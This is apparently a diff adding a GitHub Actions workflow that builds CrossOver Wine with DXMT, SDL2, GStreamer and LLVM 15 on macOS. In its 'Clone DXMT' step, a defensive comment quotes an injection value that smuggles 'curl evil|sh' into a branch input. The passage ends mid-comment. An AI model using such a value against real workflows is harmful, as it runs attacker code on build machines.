@@ -1,0 +1,807 @@
+name: Build CrossOver Wine (DXMT)
+
+# Manual only. Type a CrossOver source version and it downloads, extracts and
+# builds the Wine that CrossOver ships — with every CrossOver patch, because the
+# source drop is already the patched tree.
+#
+# The single optional patch is steam_cef_hack: CW 13322/17315/21883, the Steam
+# web-helper CEF flags CodeWeavers carried in the CX20-era tree and dropped
+# before CX26. Turn it on if Steam's login window is black with clickable
+# buttons.
+on:
+  workflow_dispatch:
+    inputs:
+      cx_version:
+        description: "CrossOver source version, e.g. 26.3.0 / 26.2.0 / 26.1.0"
+        required: true
+        default: "26.3.0"
+        type: string
+      steam_cef_hack:
+        description: "Apply the Steam web-helper CEF patch (fixes the black Steam login window)"
+        required: false
+        default: false
+        type: boolean
+      dxmt_ref:
+        description: "DXMT branch or tag"
+        required: false
+        default: "main"
+        type: string
+      make_release:
+        description: "Publish a GitHub release (otherwise upload as a build artifact only)"
+        required: false
+        default: true
+        type: boolean
+
+jobs:
+  build:
+    # x86_64 runner on purpose. CrossOver's Metal/D3DMetal bridge is gated on
+    # `#if defined(__x86_64__)` in dlls/winemac.drv/d3dmetal_objc.h, so the whole
+    # DXMT path compiles out on arm64. x86_64 under Rosetta 2 is how CrossOver
+    # itself ships on Apple Silicon.
+    runs-on: macos-15-intel
+    timeout-minutes: 360
+    permissions:
+      contents: write
+
+    env:
+      CX_VERSION: ${{ inputs.cx_version }}
+      ARTIFACT_NAME: wine-crossover-${{ inputs.cx_version }}-osx64.tar.xz
+
+    steps:
+      - uses: actions/checkout@v6
+
+      - name: Locate build script
+        id: script
+        run: |
+          # Tolerate either layout: the script at the repo root, or inside the
+          # "Wine building gitub workflow" folder alongside this workflow's
+          # source copy. The workflow itself must live in .github/workflows.
+          FOUND=""
+          for p in \
+            "build-wine-crossover.sh" \
+            "Wine building gitub workflow/build-wine-crossover.sh" \
+            "scripts/build-wine-crossover.sh" ; do
+            if [ -f "$p" ]; then FOUND="$p"; break; fi
+          done
+          if [ -z "$FOUND" ]; then
+            echo "ERROR: build-wine-crossover.sh not found. Looked in:"
+            echo "  ./build-wine-crossover.sh"
+            echo "  ./Wine building gitub workflow/build-wine-crossover.sh"
+            echo "  ./scripts/build-wine-crossover.sh"
+            echo "Repo root contains:"
+            ls -la
+            exit 1
+          fi
+          chmod +x "$FOUND"
+          echo "Using: $FOUND"
+          echo "path=$FOUND" >> "$GITHUB_OUTPUT"
+
+      - name: Pre-flight — CrossOver source is reachable
+        run: |
+          # cx_version is free text, so validate it before it reaches a URL, a
+          # filename or a release tag. Digits and dots only.
+          case "${CX_VERSION}" in
+            *[!0-9.]*|""|.*|*.)
+              echo "ERROR: '${CX_VERSION}' is not a CrossOver version number."
+              echo "       Expected digits and dots only, e.g. 26.3.0"
+              exit 1 ;;
+          esac
+          URL="https://media.codeweavers.com/pub/crossover/source/crossover-sources-${CX_VERSION}.tar.gz"
+          echo "Checking ${URL}"
+          # A range request for the first byte rather than HEAD: if the CDN ever
+          # rejects or 405s HEAD, a HEAD-based check would fail pre-flight on a
+          # perfectly good URL.
+          curl -fsSL -r 0-0 -o /dev/null "$URL" \
+            || { echo "ERROR: crossover-sources-${CX_VERSION}.tar.gz not found at media.codeweavers.com"; exit 1; }
+          echo "Source archive is reachable."
+
+      - name: Pre-flight — Steam CEF patch is present and applies
+        if: ${{ inputs.steam_cef_hack }}
+        env:
+          SCRIPT_PATH: ${{ steps.script.outputs.path }}
+        run: |
+          # Fail in seconds if the patch is missing or has drifted, rather than
+          # 40 minutes into the download+extract.
+          PATCH_DIR="$(dirname "$SCRIPT_PATH")/patches"
+          P="$PATCH_DIR/0001-kernelbase-steamwebhelper-cef.patch"
+          if [ ! -f "$P" ]; then
+            echo "ERROR: $P not found."
+            echo "       The patches/ directory must be committed next to the build script."
+            ls -la "$(dirname "$SCRIPT_PATH")"
+            exit 1
+          fi
+          echo "Found $P ($(wc -c < "$P") bytes)"
+          grep -q 'steamwebhelper.exe' "$P" \
+            || { echo "ERROR: patch does not mention steamwebhelper.exe"; exit 1; }
+          grep -q 'hack_append_command_line' "$P" \
+            || { echo "ERROR: patch does not add hack_append_command_line"; exit 1; }
+          echo "Patch looks sane. It is dry-run against the real tree inside the build script."
+
+      - name: Install build dependencies
+        run: |
+          # The runner image ships third-party taps that can fail to load under
+          # its Ruby — hashicorp/tap's vagrant.rb is the usual offender, giving
+          # "Error: Failed to import: .../Formula/vagrant.rb". Nothing here needs
+          # that tap, but under `bash -e` a non-zero exit from brew would kill the
+          # whole job, so drop the tap and never let `brew update` be fatal.
+          brew untap hashicorp/tap 2>/dev/null || true
+          brew update || echo "brew update reported a problem — continuing, the runner image's Homebrew is recent enough"
+
+          # Verified against the Homebrew API on 2026-08-28.
+          #
+          # `gstreamer` is deliberately NOT in this list, for one specific reason:
+          # it has 61 direct dependencies and one of them, pygobject3 3.58.0, has
+          # bottle tags arm64_linux, arm64_sequoia, arm64_sonoma, arm64_tahoe,
+          # x86_64_linux — NO macOS Intel bottle at all, not even sonoma. So on an
+          # Intel runner brew must build it from source, and that is what failed.
+          # gstreamer itself does have an Intel sonoma bottle and brew falls back
+          # to the nearest older Intel bottle happily; pygobject3 has nothing to
+          # fall back to. Homebrew 6.0 moved macOS Intel to Tier 3 (no new Intel
+          # bottles from September 2026), so this will only get worse.
+          # GStreamer therefore comes from the project's own Universal .pkg — see
+          # the next step.
+          #
+          # NOTE on names: sdl2, gst-plugins-base/-good/-bad, pkg-config and
+          # pkgconfig all 404 on the formula JSON API but still install fine,
+          # because Homebrew resolves them via aliases/oldnames (sdl2 ->
+          # sdl2-compat, gst-plugins-* -> gstreamer, pkg-config -> pkgconf). The
+          # canonical names are used here so the mapping cannot be deprecated out
+          # from under this workflow.
+          #
+          # Most of these have only an Intel `sonoma` bottle, not `sequoia`.
+          # That is fine: Homebrew falls back to the nearest older Intel bottle,
+          # which is how mingw-w64, bison and ccache all installed successfully
+          # on this runner already.
+          #
+          # `sdl2` / `sdl2-compat` is deliberately NOT here. Homebrew's `sdl2` is
+          # an alias for `sdl2-compat`, the SDL2 API reimplemented on top of SDL3,
+          # which dlopens libSDL3.dylib at runtime. Wine's configure accepts it
+          # (same soname, same headers) and the build succeeds, but the shipped
+          # dylib then aborts inside SDL_Init() on any machine without SDL3 — the
+          # SDL gamepad bus never starts, and with Disable Hidraw on there is no
+          # gamepad bus at all: no controller, no Bluetooth rumble. CrossOver.app
+          # ships real SDL 2.30.12, so the next step builds exactly that.
+          FORMULAE="bison ccache gettext mingw-w64 pkgconf freetype gnutls libpcap
+                    molten-vk vulkan-loader vulkan-headers
+                    cmake ninja xz"
+
+          # One formula per `brew install` call, and output is NOT folded into a
+          # ::group:: — when this fails the error must be visible in the log
+          # without expanding anything. A single combined `brew install a b c` is
+          # a trap: brew aborts the whole command on the first unknown name or
+          # conflict, silently leaving every later formula uninstalled.
+          for f in ${FORMULAE}; do
+            if brew list --formula "$f" >/dev/null 2>&1; then
+              echo "  already installed : $f"
+              continue
+            fi
+            echo "--- brew install $f ---"
+            if brew install "$f"; then
+              echo "  installed         : $f"
+            else
+              echo "  *** INSTALL FAILED: $f ***"
+            fi
+          done
+
+          # If the runner image (or a dependency) dragged sdl2-compat in anyway,
+          # its keg must not win the pkg-config lookup. Unlink rather than
+          # uninstall: uninstalling could cascade into a dependent formula.
+          if brew list --formula sdl2-compat >/dev/null 2>&1; then
+            echo "sdl2-compat is present on this runner — unlinking it so the"
+            echo "real SDL2 built in the next step wins pkg-config resolution."
+            brew unlink sdl2-compat || true
+          fi
+
+          echo "=== Hard gate: the formulae this build cannot proceed without ==="
+          missing=""
+          for f in bison ccache mingw-w64 pkgconf gnutls freetype molten-vk cmake ninja; do
+            if brew list --formula "$f" >/dev/null 2>&1; then
+              echo "  OK      $f"
+            else
+              echo "  MISSING $f"
+              missing="${missing} $f"
+            fi
+          done
+          if [ -n "${missing}" ]; then
+            echo "ERROR: required formulae did not install:${missing}"
+            exit 1
+          fi
+
+      - name: Build real SDL2 (2.30.12, the version CrossOver ships)
+        run: |
+          # CrossOver.app/Contents/SharedSupport/CrossOver/lib64/libSDL2-2.0.0.dylib
+          # is SDL-release-2.30.12-0-g8236e01a9, 1366544 bytes, linking CoreAudio,
+          # CoreHaptics, GameController and ForceFeedback. That is what
+          # dlls/winebus.sys/bus_sdl.c dlopens, and what makes a DualShock 4 over
+          # Bluetooth show up as an XInput pad with working rumble (CW HACK 19629).
+          #
+          # Built from the upstream release tarball rather than Homebrew because
+          # Homebrew no longer packages real SDL2 on macOS at all. Installed into
+          # /usr/local so it is already covered by the build script's
+          # FOREIGN_RE bundling filter (^(/usr/local/|/opt/homebrew/|...)).
+          set -euo pipefail
+          SDL_VER="2.30.12"
+          URL="https://github.com/libsdl-org/SDL/releases/download/release-${SDL_VER}/SDL2-${SDL_VER}.tar.gz"
+          echo "Downloading ${URL}"
+          curl -fL --retry 3 --retry-delay 5 -o "/tmp/SDL2-${SDL_VER}.tar.gz" "$URL"
+          tar -xzf "/tmp/SDL2-${SDL_VER}.tar.gz" -C /tmp
+          cd "/tmp/SDL2-${SDL_VER}"
+          cmake -B build -G Ninja \
+            -DCMAKE_BUILD_TYPE=Release \
+            -DSDL_SHARED=ON -DSDL_STATIC=OFF -DSDL_TEST=OFF \
+            -DCMAKE_OSX_ARCHITECTURES=x86_64 \
+            -DCMAKE_OSX_DEPLOYMENT_TARGET=10.15 \
+            -DCMAKE_INSTALL_PREFIX=/usr/local
+          cmake --build build --parallel "$(sysctl -n hw.ncpu)"
+          sudo cmake --install build
+          echo "--- installed ---"
+          ls -la /usr/local/lib/libSDL2*.dylib
+          test -f /usr/local/lib/pkgconfig/sdl2.pc \
+            || { echo "ERROR: /usr/local/lib/pkgconfig/sdl2.pc was not installed"; exit 1; }
+          test -f /usr/local/include/SDL2/SDL.h \
+            || { echo "ERROR: /usr/local/include/SDL2/SDL.h was not installed"; exit 1; }
+          # Prove it is not sdl2-compat before a single line of Wine is compiled.
+          # grep reads the binary directly with -a: a `strings | grep -m1` pipeline
+          # would SIGPIPE strings when grep exits on the first match, and pipefail
+          # would then report 141 for a check that actually SUCCEEDED.
+          if grep -a 'sdl2-compat' /usr/local/lib/libSDL2-2.0.0.dylib >/dev/null; then
+            echo "ERROR: the SDL2 that just got installed is sdl2-compat. Aborting."
+            exit 1
+          fi
+          grep -a -m1 'SDL-release-2' /usr/local/lib/libSDL2-2.0.0.dylib \
+            || { echo "ERROR: no SDL-release-2.x version string in the built dylib"; exit 1; }
+          echo "--- frameworks ---"
+          # `|| true`: grep -oE exits 1 when nothing matches, and pipefail would
+          # turn an informational line into a build failure.
+          otool -L /usr/local/lib/libSDL2-2.0.0.dylib \
+            | grep -oE '(CoreHaptics|GameController|ForceFeedback|CoreAudio)' | sort -u || true
+          rm -rf "/tmp/SDL2-${SDL_VER}" "/tmp/SDL2-${SDL_VER}.tar.gz"
+
+      - name: Install GStreamer (official Universal framework)
+        run: |
+          # The GStreamer project ships Universal (x86_64 + ARM64) .pkg installers,
+          # currently 1.28.6 — the same version as the Homebrew formula, but with
+          # no bottle-architecture problem and no 60-formula dependency tree.
+          # Verified 2026-08-28: both URLs return HTTP 200.
+          #   https://gstreamer.freedesktop.org/data/pkg/osx/1.28.6/gstreamer-1.0-1.28.6-universal.pkg
+          #   https://gstreamer.freedesktop.org/data/pkg/osx/1.28.6/gstreamer-1.0-devel-1.28.6-universal.pkg
+          # It installs to /Library/Frameworks/GStreamer.framework/Versions/1.0
+          # with lib/pkgconfig, and carries every plugin CrossOver.app ships.
+          #
+          # Non-fatal by design: if this cannot be installed, the build continues
+          # without winegstreamer rather than burning the run. The build script
+          # only passes --with-gstreamer when pkg-config can actually see it.
+          GST_VER="1.28.6"
+          BASE="https://gstreamer.freedesktop.org/data/pkg/osx/${GST_VER}"
+          ok=1
+          for p in "gstreamer-1.0-${GST_VER}-universal.pkg" "gstreamer-1.0-devel-${GST_VER}-universal.pkg"; do
+            echo "--- ${p} ---"
+            if curl -fL --retry 3 --retry-delay 5 -o "/tmp/${p}" "${BASE}/${p}"; then
+              sudo installer -pkg "/tmp/${p}" -target / || { echo "  installer failed for ${p}"; ok=0; }
+              rm -f "/tmp/${p}"
+            else
+              echo "  download failed for ${p}"
+              ok=0
+            fi
+          done
+          GST_FW="/Library/Frameworks/GStreamer.framework/Versions/1.0"
+          if [ "$ok" -eq 1 ] && [ -d "${GST_FW}/lib/pkgconfig" ]; then
+            echo "GStreamer framework installed at ${GST_FW}"
+            ls -1 "${GST_FW}/lib/pkgconfig" | head -20
+          else
+            echo "WARNING: GStreamer framework not available — the build will continue"
+            echo "without winegstreamer. Wine 11 still has winedmo (FFmpeg) for media."
+          fi
+
+      - name: Resolve PKG_CONFIG_PATH
+        run: |
+          # Homebrew symlinks .pc files into $(brew --prefix)/lib/pkgconfig for
+          # non-keg-only formulae, but add each keg's own pkgconfig dir too so a
+          # formula that becomes keg-only later cannot silently disappear from
+          # configure's view.
+          BP="$(brew --prefix)"
+          # /usr/local/lib/pkgconfig comes FIRST: that is where the real SDL2
+          # built in the "Build real SDL2" step installs its sdl2.pc, and it must
+          # win over any sdl2-compat keg the runner image happens to carry.
+          PCP="/usr/local/lib/pkgconfig:${BP}/lib/pkgconfig:${BP}/share/pkgconfig"
+          # GStreamer comes from the official Universal framework, not Homebrew,
+          # so its pkgconfig dir has to be added explicitly. Put it FIRST so its
+          # glib wins over any Homebrew glib of a different vintage.
+          GST_FW="/Library/Frameworks/GStreamer.framework/Versions/1.0"
+          if [ -d "${GST_FW}/lib/pkgconfig" ]; then
+            PCP="${GST_FW}/lib/pkgconfig:${PCP}"
+          fi
+          # libpcap is deliberately NOT in this list. Homebrew's libpcap is
+          # keg-only (:provided_by_macos), and adding its pkgconfig dir would make
+          # configure prefer the keg over the system libpcap that macOS provides —
+          # a change from the previously working build, which linked the system
+          # one via configure's `-lpcap` fallback. bison is keg-only too and is
+          # handled by putting its bin dir on PATH inside the build script.
+          # sdl2-compat / sdl3 are deliberately absent from this list: their
+          # pkgconfig dirs must never enter PKG_CONFIG_PATH, or configure could
+          # resolve sdl2 to the SDL3 shim again.
+          for k in freetype gnutls molten-vk vulkan-loader; do
+            p="$(brew --prefix "$k" 2>/dev/null || true)"
+            [ -n "$p" ] && [ -d "$p/lib/pkgconfig" ] && PCP="${PCP}:$p/lib/pkgconfig"
+          done
+          echo "PKG_CONFIG_PATH=${PCP}" >> "$GITHUB_ENV"
+          echo "PKG_CONFIG_PATH=${PCP}"
+
+      - name: Pre-flight — toolchain
+        run: |
+          fail=0
+          check() {
+            if "$@" >/dev/null 2>&1; then
+              echo "  OK    $1"
+            else
+              echo "  FAIL  $1"
+              fail=1
+            fi
+          }
+          check clang --version
+          check ccache --version
+          check cmake --version
+          check ninja --version
+          check i686-w64-mingw32-gcc --version
+          check x86_64-w64-mingw32-gcc --version
+          check flex --version
+          check perl -v
+          check xz --version
+          check "$(brew --prefix bison)/bin/bison" --version
+
+          echo "  --- pkg-config modules (FATAL) ---"
+          for mod in freetype2 gnutls sdl2; do
+            if pkg-config --exists "$mod"; then
+              echo "  OK    $mod $(pkg-config --modversion "$mod" 2>/dev/null)"
+            else
+              echo "  FAIL  $mod"
+              fail=1
+            fi
+          done
+
+          echo "  --- GStreamer (NON-fatal: build continues without winegstreamer) ---"
+          # Wine's configure requires all four of these together, see configure.ac:
+          # WINE_PACKAGE_FLAGS(GSTREAMER,[gstreamer-1.0 gstreamer-video-1.0
+          # gstreamer-audio-1.0 gstreamer-tag-1.0]). The build script only passes
+          # --with-gstreamer when all four resolve, because an explicit --with-X
+          # turns Wine's "not found" notice into a hard configure error.
+          gst_ok=1
+          for mod in gstreamer-1.0 gstreamer-audio-1.0 gstreamer-video-1.0 gstreamer-tag-1.0; do
+            if pkg-config --exists "$mod"; then
+              echo "  OK    $mod $(pkg-config --modversion "$mod" 2>/dev/null)"
+            else
+              echo "  WARN  $mod not found"
+              gst_ok=0
+            fi
+          done
+          if [ "$gst_ok" -eq 1 ]; then
+            echo "  => GStreamer support WILL be built"
+            echo "WINE_ENABLE_GSTREAMER=1" >> "$GITHUB_ENV"
+          else
+            echo "  => GStreamer support will be SKIPPED (winedmo/FFmpeg still handles media in Wine 11)"
+            echo "WINE_ENABLE_GSTREAMER=0" >> "$GITHUB_ENV"
+          fi
+
+          echo "  --- SDL2 dylib that Wine will dlopen at runtime (FATAL) ---"
+          # Must be the real SDL2 built earlier, not Homebrew's sdl2-compat.
+          # sdl2-compat satisfies configure and then aborts inside SDL_Init() on
+          # any machine without SDL3, which kills the gamepad bus outright.
+          SDL_LIB="/usr/local/lib/libSDL2-2.0.0.dylib"
+          if [ ! -f "${SDL_LIB}" ]; then
+            echo "  FAIL  ${SDL_LIB} not found"
+            fail=1
+          elif grep -a 'sdl2-compat' "${SDL_LIB}" >/dev/null; then
+            echo "  FAIL  ${SDL_LIB} is sdl2-compat, not real SDL2"
+            fail=1
+          else
+            echo "  OK    ${SDL_LIB} ($(stat -f%z "${SDL_LIB}") bytes)"
+            echo "        $(grep -a -m1 'SDL-release-2' "${SDL_LIB}" || echo '<no version string>')"
+          fi
+          # And the .pc that configure will actually read must be the same one.
+          SDL_PC_VER="$(pkg-config --modversion sdl2 2>/dev/null || true)"
+          case "${SDL_PC_VER}" in
+            2.*) echo "  OK    pkg-config sdl2 = ${SDL_PC_VER}" ;;
+            *)   echo "  FAIL  pkg-config sdl2 reports '${SDL_PC_VER:-<none>}', expected 2.x"; fail=1 ;;
+          esac
+          SDL_PC_LIBDIR="$(pkg-config --variable=libdir sdl2 2>/dev/null || true)"
+          echo "        sdl2.pc libdir: ${SDL_PC_LIBDIR:-<unknown>}"
+
+          if [ "$fail" -ne 0 ]; then
+            echo ""
+            echo "Pre-flight failed. Nothing was compiled, so no CI time was wasted."
+            echo "PKG_CONFIG_PATH was: ${PKG_CONFIG_PATH:-<unset>}"
+            echo "Installed formulae:"
+            brew list --formula | tr '\n' ' '
+            exit 1
+          fi
+          echo "Pre-flight passed."
+
+      - uses: hendrikmuhs/ccache-action@v1
+        with:
+          # The CEF patch changes dlls/kernelbase/process.c, so a cache shared
+          # with a non-patched build would be a false hit for that one object.
+          # ccache hashes preprocessed source, so it would actually be correct —
+          # but keying them apart makes the two variants trivially comparable.
+          key: wine-crossover-${{ inputs.cx_version }}-cef${{ inputs.steam_cef_hack }}
+          max-size: 5G
+
+      # Clone DXMT and install Meson BEFORE the ~60-minute Wine build. Both cost
+      # seconds and neither needs the Wine tree, but both can fail: a bad
+      # dxmt_ref, or pip's console script not landing on PATH. Doing them here
+      # means those failures cost seconds instead of the whole run. The DXMT
+      # *meson setup* steps still have to come after Wine, because they need
+      # workdir/build-wine and tools/widl/widl.
+      - name: Clone DXMT
+        # dxmt_ref goes through env, not ${{ }} interpolation. Interpolating a
+        # free-form string input directly into a run: block splices it into the
+        # shell before bash ever sees it, so a value like `main"; curl evil|sh; "`
+        # would execute.
+        env:
+          DXMT_REF: ${{ inputs.dxmt_ref }}
+        run: |
+          git clone --depth 1 --recurse-submodules \
+            --branch "$DXMT_REF" \
+            https://github.com/3Shain/DXMT.git dxmt-src
+          test -f dxmt-src/build-win64.txt || { echo "ERROR: build-win64.txt missing from DXMT"; exit 1; }
+          test -f dxmt-src/build-win32.txt || { echo "ERROR: build-win32.txt missing from DXMT"; exit 1; }
+          echo "DXMT: $(git -C dxmt-src log --oneline -1)"
+
+      - name: Install Meson
+        run: |
+          pip3 install meson==1.10.0 --break-system-packages
+          meson --version
+
+      - name: Build Wine from CrossOver source
+        env:
+          BUILD_SCRIPT: ${{ steps.script.outputs.path }}
+          APPLY_STEAM_CEF_HACK: ${{ inputs.steam_cef_hack && '1' || '0' }}
+        run: |
+          echo "APPLY_STEAM_CEF_HACK=${APPLY_STEAM_CEF_HACK}"
+          ./"$BUILD_SCRIPT" "${CX_VERSION}"
+
+      - name: Verify Wine artifact
+        run: |
+          test -f "${ARTIFACT_NAME}" || { echo "ERROR: ${ARTIFACT_NAME} not produced"; exit 1; }
+          ls -lh "${ARTIFACT_NAME}"
+
+          # The script writes this so later steps do not have to recompute paths.
+          test -f .wine-build-paths || { echo "ERROR: .wine-build-paths missing"; exit 1; }
+          cat .wine-build-paths
+
+          WINE_BUILD="${GITHUB_WORKSPACE}/workdir/build-wine"
+          test -d "${WINE_BUILD}" || { echo "ERROR: Wine build dir missing"; exit 1; }
+          test -x "${WINE_BUILD}/tools/widl/widl" \
+            || { echo "ERROR: widl not found — DXMT needs it to build"; exit 1; }
+          echo "widl: $("${WINE_BUILD}/tools/widl/widl" --version 2>&1 | head -1)"
+
+      - name: Cache LLVM 15
+        id: cache-llvm
+        uses: actions/cache@v5
+        with:
+          key: llvm-15.0.7-darwin-x86_64
+          path: toolchains/llvm-darwin
+
+      - name: Build LLVM 15 for Darwin
+        if: steps.cache-llvm.outputs.cache-hit != 'true'
+        run: |
+          echo "Cache miss — building LLVM 15.0.7 from source (~30 min, cached after this)"
+          git clone --depth 1 --branch llvmorg-15.0.7 \
+            https://github.com/llvm/llvm-project.git toolchains/llvm-project
+
+          cmake -B toolchains/llvm-darwin-build \
+            -S toolchains/llvm-project/llvm \
+            -DCMAKE_INSTALL_PREFIX="$(pwd)/toolchains/llvm-darwin" \
+            -DCMAKE_OSX_ARCHITECTURES=x86_64 \
+            -DLLVM_HOST_TRIPLE=x86_64-apple-darwin \
+            -DLLVM_ENABLE_ASSERTIONS=On \
+            -DLLVM_ENABLE_ZSTD=Off \
+            -DCMAKE_BUILD_TYPE=Release \
+            -DLLVM_TARGETS_TO_BUILD="" \
+            -DLLVM_BUILD_TOOLS=Off \
+            -DBUG_REPORT_URL="https://github.com/3Shain/dxmt" \
+            -DPACKAGE_VENDOR="DXMT" \
+            -DLLVM_VERSION_PRINTER_SHOW_HOST_TARGET_INFO=Off \
+            -G Ninja
+
+          cmake --build toolchains/llvm-darwin-build -j"$(sysctl -n hw.ncpu)"
+          cmake --install toolchains/llvm-darwin-build
+
+          # Only the install prefix gets cached, not the build tree.
+          rm -rf toolchains/llvm-project toolchains/llvm-darwin-build
+          echo "LLVM 15 built: $(ls toolchains/llvm-darwin/bin/ 2>/dev/null | tr '\n' ' ')"
+
+      - name: Verify LLVM
+        run: |
+          LLVM_PATH="$(pwd)/toolchains/llvm-darwin"
+          test -d "${LLVM_PATH}" || { echo "ERROR: LLVM path missing"; exit 1; }
+          ls "${LLVM_PATH}/lib/"*.a >/dev/null 2>&1 \
+            || { echo "ERROR: LLVM static libs missing"; exit 1; }
+          echo "LLVM OK at ${LLVM_PATH}"
+
+      - name: Build DXMT (64-bit + winemetal)
+        run: |
+          LLVM_PATH="$(pwd)/toolchains/llvm-darwin"
+          WINE_BUILD="${GITHUB_WORKSPACE}/workdir/build-wine"
+
+          meson setup \
+            --cross-file "${GITHUB_WORKSPACE}/dxmt-src/build-win64.txt" \
+            -Dnative_llvm_path="${LLVM_PATH}" \
+            -Dwine_build_path="${WINE_BUILD}" \
+            -Denable_nvapi=true \
+            dxmt-build \
+            "${GITHUB_WORKSPACE}/dxmt-src" \
+            --buildtype release \
+            --prefix "${GITHUB_WORKSPACE}/dxmt-install" \
+            --strip
+
+          meson compile -C dxmt-build
+          meson install -C dxmt-build
+
+      - name: Build DXMT (32-bit WoW64)
+        run: |
+          WINE_BUILD="${GITHUB_WORKSPACE}/workdir/build-wine"
+
+          meson setup \
+            --cross-file "${GITHUB_WORKSPACE}/dxmt-src/build-win32.txt" \
+            -Dwine_build_path="${WINE_BUILD}" \
+            dxmt-build32 \
+            "${GITHUB_WORKSPACE}/dxmt-src" \
+            --buildtype release \
+            --prefix "${GITHUB_WORKSPACE}/dxmt-install" \
+            --strip
+
+          meson compile -C dxmt-build32
+          meson install -C dxmt-build32
+
+      - name: Verify DXMT output
+        run: |
+          DXMT_INSTALL="${GITHUB_WORKSPACE}/dxmt-install"
+          echo "=== DXMT install tree ==="
+          find "${DXMT_INSTALL}" -type f | sort
+
+          WINEMETAL=$(find "${DXMT_INSTALL}" \
+            \( -name "winemetal.so" -o -name "winemetal.dylib" \) 2>/dev/null | head -1)
+          test -n "${WINEMETAL}" || { echo "ERROR: winemetal not found in DXMT output"; exit 1; }
+          echo "winemetal: ${WINEMETAL}"
+
+          DXGI=$(find "${DXMT_INSTALL}" -name "dxgi.dll" 2>/dev/null | head -1)
+          test -n "${DXGI}" || { echo "ERROR: dxgi.dll not found — 64-bit build failed"; exit 1; }
+          echo "dxgi.dll: ${DXGI}"
+
+      - name: Diagnose DXMT to Wine symbol interface
+        continue-on-error: true
+        run: |
+          WINEMETAL=$(find "${GITHUB_WORKSPACE}/dxmt-install" -name "winemetal.so" | head -1)
+          MACDRV="${GITHUB_WORKSPACE}/workdir/build-wine/dlls/winemac.drv/winemac.so"
+
+          echo "=== Undefined symbols winemetal.so needs from Wine/macdrv ==="
+          # On Mach-O, `nm -u` prints ONLY the undefined symbol names — there is
+          # no address/type column — so an `/^[[:space:]]+U /` filter matches
+          # nothing and this section would silently print empty while looking
+          # like it succeeded. Just strip the leading underscore and sort.
+          nm -u "${WINEMETAL}" 2>/dev/null | sed 's/^_//' | sort -u
+
+          echo ""
+          echo "=== macdrv_functions dispatch table (what DXMT dlsym()s) ==="
+          # DXMT does dlsym(RTLD_DEFAULT, "macdrv_functions") to fetch a whole
+          # struct of function pointers. In CrossOver source this is exported
+          # natively from d3dmetal.c, so a miss here means the build broke.
+          # Plain `grep`, not `grep -q`: -q exits on first match and SIGPIPEs nm.
+          nm -g "${MACDRV}" 2>/dev/null | awk '/ [TDSB] /{print $NF}' | sed 's/^_//' \
+            | grep -w 'macdrv_functions' >/dev/null \
+            && echo "  present" \
+            || echo "  MISSING — DXMT will fail its dlsym lookup at runtime"
+
+          echo ""
+          echo "=== macdrv_client_surface_create ==="
+          nm -g "${MACDRV}" 2>/dev/null | awk '/ [TDSB] /{print $NF}' | sed 's/^_//' \
+            | grep -w 'macdrv_client_surface_create' >/dev/null \
+            && echo "  present" \
+            || echo "  not exported (may be internal in this version)"
+
+      - name: Bundle DXMT into the Wine tree
+        run: |
+          INJECT_DIR="${GITHUB_WORKSPACE}/dxmt-inject"
+          DXMT_INSTALL="${GITHUB_WORKSPACE}/dxmt-install"
+
+          rm -rf "${INJECT_DIR}"
+          mkdir -p "${INJECT_DIR}"
+          tar -xJf "${ARTIFACT_NAME}" -C "${INJECT_DIR}"
+
+          WINE_ROOT="${INJECT_DIR}/wine"
+          test -d "${WINE_ROOT}" \
+            || { echo "ERROR: expected a top-level wine/ directory inside ${ARTIFACT_NAME}"; exit 1; }
+
+          # winemetal goes on Wine's native bridge load path. The launcher's
+          # standaloneWineEnv() points DYLD_FALLBACK_LIBRARY_PATH at the Wine
+          # install so this is where it gets found.
+          mkdir -p "${WINE_ROOT}/lib/wine/x86_64-unix"
+          WINEMETAL=$(find "${DXMT_INSTALL}" \
+            \( -name "winemetal.so" -o -name "winemetal.dylib" \) | head -1)
+          test -n "${WINEMETAL}" || { echo "ERROR: no winemetal in DXMT install"; exit 1; }
+          cp "${WINEMETAL}" "${WINE_ROOT}/lib/wine/x86_64-unix/winemetal.so"
+          # Also install under the .dylib name. The launcher accepts either
+          # (its bridgeNames set covers winemetal.so, winemetal.dylib and
+          # libdxmtapi.dylib), but standaloneWineEnv() sets
+          # DYLD_FALLBACK_LIBRARY_PATH specifically so macOS can resolve
+          # winemetal.dylib — so provide both names and let whichever resolver
+          # runs find what it looks for.
+          cp "${WINEMETAL}" "${WINE_ROOT}/lib/wine/x86_64-unix/winemetal.dylib"
+          echo "Deployed winemetal.so + winemetal.dylib"
+
+          # DXMT's Windows DLLs. Two layouts are written on purpose:
+          #
+          #  1. lib/dxmt/{x86_64-windows,i386-windows,x86_64-unix} — CrossOver's
+          #     own layout, verified against
+          #     CrossOver.app/Contents/SharedSupport/CrossOver/lib/dxmt/.
+          #     The launcher handles these names natively: ensureDxmtInBottle()
+          #     matches the 64-bit dir with /^(x86.?64|x64|win64)/i (so
+          #     "x86_64-windows" hits) and lists "i386-windows" first among its
+          #     32-bit sibling candidates.
+          #  2. share/dxmt/{x86_64,x86} — kept as a compatibility mirror, since an
+          #     existing install may already have standalonDxmtDir pointing there.
+          #
+          # The duplication is a few MB and means neither path can be the one that
+          # silently isn't found.
+          mkdir -p "${WINE_ROOT}/lib/dxmt/x86_64-windows" \
+                   "${WINE_ROOT}/lib/dxmt/i386-windows" \
+                   "${WINE_ROOT}/lib/dxmt/x86_64-unix" \
+                   "${WINE_ROOT}/share/dxmt/x86_64" \
+                   "${WINE_ROOT}/share/dxmt/x86"
+
+          find "${DXMT_INSTALL}" -path "*/x86_64-windows/*.dll" -type f \
+            -exec cp {} "${WINE_ROOT}/lib/dxmt/x86_64-windows/" \;
+          find "${DXMT_INSTALL}" -path "*/i386-windows/*.dll" -type f \
+            -exec cp {} "${WINE_ROOT}/lib/dxmt/i386-windows/" \;
+          cp "${WINEMETAL}" "${WINE_ROOT}/lib/dxmt/x86_64-unix/winemetal.so"
+
+          cp "${WINE_ROOT}"/lib/dxmt/x86_64-windows/*.dll "${WINE_ROOT}/share/dxmt/x86_64/" 2>/dev/null || true
+          cp "${WINE_ROOT}"/lib/dxmt/i386-windows/*.dll   "${WINE_ROOT}/share/dxmt/x86/"    2>/dev/null || true
+
+          X64=$(find "${WINE_ROOT}/lib/dxmt/x86_64-windows" -name '*.dll' | wc -l | tr -d ' ')
+          X86=$(find "${WINE_ROOT}/lib/dxmt/i386-windows" -name '*.dll' | wc -l | tr -d ' ')
+          # Gate BOTH counts. `find -exec cp` exits 0 when nothing matches, so
+          # without the 32-bit gate a DXMT layout change would ship an artifact
